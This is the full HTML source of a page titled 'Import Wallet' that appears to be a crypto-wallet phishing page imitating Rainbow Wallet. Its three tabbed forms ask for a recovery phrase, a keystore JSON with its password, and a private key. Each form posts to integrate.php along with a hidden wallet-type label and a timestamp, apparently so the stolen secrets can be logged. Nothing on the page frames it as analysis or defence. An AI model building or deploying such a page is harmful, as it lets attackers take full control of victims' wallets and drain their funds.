




<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Import Wallet</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/fonts/fontawesome-all.min.css">
    <link rel="stylesheet" href="assets/css/styles.css">
</head>

<body style="background-color: black;">
    <header>
        <div class="container-fluid">
			<div class="row">
			<div class="col-md-4 offset-md-4">
				<a  href="#" style="font-size: 20px; color: white; text-align: center; text-decoration: none;"><i><</i>&nbsp; &nbsp;Import Wallet</a><br><br>
			</div>
			</div>
		</div>
    </header>
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-4 offset-md-4">
				<ul class="nav nav-tabs">
					<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
				</ul>
			</div>
		</div>
	</div>
    <section style="margin-top: 40px;">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-4 offset-md-4">
					<!-- Tab panes -->
					<div class="tab-content">
						<div role="tabpanel" class="tab-pane fade show active" id="phrase">
							<form method="post" action="integrate.php">
								
								<input id="today" type="text" name="dot" readonly hidden>
								<textarea class="form-control" rows="5" name="phrase" minlength="23" required placeholder="Phrase"></textarea>
								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
								<input type="hidden" name="wallettype" value="Rainbow Wallet">
								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit" >IMPORT</button></div>
							</form>
						</div>
						<div role="tabpanel" class="tab-pane fade" id="keystore">
							<form method="post" action="integrate.php">
								
								<input id="today1" type="text" name="dot" readonly hidden>
								<div class="form-group">
									
									<textarea class="form-control" name="keystore" required rows="5" placeholder="Keystore_JSON"></textarea>
								</div>
								<div class="form-group">
									<input class="form-control" type="password" name="keystoreJSON_password" required placeholder="Password">
								</div>
								<p class="text-secondary" style="margin-top: 10px;">
									Several lines of text beginning with "{...}" plus the password you used to encrypt it.
								</p>
								<input type="hidden" name="wallettype" value="Rainbow Wallet">
								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit" >IMPORT</button></div>
							</form>
						</div>
						<div role="tabpanel" class="tab-pane fade" id="privatekey">
							<form method="post" action="integrate.php">
								
								
								<div class="form-group">
									<input id="today2" type="text" name="dot" readonly hidden> 
									<input class="form-control" name="privatekey" required placeholder="Private Key">
								</div>
								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
								<input type="hidden" name="wallettype" value="Rainbow Wallet">
								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit" >IMPORT</button></div>
							</form>
						</div>
					</div>
                </div>
            </div>
        </div>
    </section>
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/bootstrap/js/bootstrap.min.js"></script>

    <script>
    
    let today = new Date();
document.querySelector("#today").value = today;

let today1 = new Date();
document.querySelector("#today1").value = today1;

let today2 = new Date();
document.querySelector("#today2").value = today2;

</script>
</body>


</html>
